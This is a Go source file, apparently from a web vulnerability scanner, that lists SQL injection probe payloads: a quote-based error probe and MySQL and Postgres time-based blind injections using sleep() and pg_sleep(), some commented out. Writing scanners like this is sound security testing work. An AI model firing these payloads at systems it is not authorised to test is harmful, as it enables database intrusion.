package sqli

import "gitlab.com/browserker/browserk"

func (p *Plugin) initAttacks() {
	// generic error based
	p.attacks = append(p.attacks, &SQLIAttack{
		DBTech: browserk.Unknown,
		Attack: "'\"",
	})

	// mysql string
	// NOTE: mysql will execute this in a where class against *every row returned*
	p.attacks = append(p.attacks, &SQLIAttack{
		DBTech:      browserk.DBMySQL,
		Prefix:      "'+",
		Suffix:      "+'",
		Description: "Timing attack with string concatenation",
		IsTiming:    true,
		Attack:      "(select(sleep(%d)))",
	})
	/*
		// mysql int
		p.attacks = append(p.attacks, &SQLIAttack{
			DBTech:      browserk.DBMySQL,
			Prefix:      "-",
			IsTiming:    true,
			Description: "Timing attack in integer field",
			Attack:      "(select(sleep(%d)))",
		})

		// todo: mysql column

		// postgres int
		p.attacks = append(p.attacks, &SQLIAttack{
			DBTech:      browserk.DBPostgres,
			Prefix:      "-",
			IsTiming:    true,
			Description: "Timing attack in integer field",
			Attack:      "((select(pg_sleep(%d))isnull)::int)",
		})

		// postgres string
		p.attacks = append(p.attacks, &SQLIAttack{
			DBTech:      browserk.DBPostgres,
			Prefix:      "'||",
			Suffix:      "||'",
			IsTiming:    true,
			Description: "Timing attack with string concatenation",
			Attack:      "(select(pg_sleep(%d)))",
		})
	*/

	// todo: postgres column
}
